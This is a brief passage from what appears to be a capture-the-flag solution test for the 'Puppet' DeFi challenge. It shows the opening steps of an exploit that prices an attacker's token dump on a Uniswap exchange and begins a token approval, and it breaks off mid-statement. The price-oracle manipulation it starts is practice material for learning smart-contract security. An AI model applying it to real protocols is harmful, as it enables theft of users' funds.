...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    ...
    // Amount of ETH that can be bought in exchange for 'ATTACKER_INITIAL_TOKEN_BALANCE'
    let ethToBuy = await this.uniswapExchange.getTokenToEthInputPrice(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      { gasLimit: 1e6 }
    );

    // Giving approval of token to uniswapExchange contract
    await this.token
      .connect(attacker)
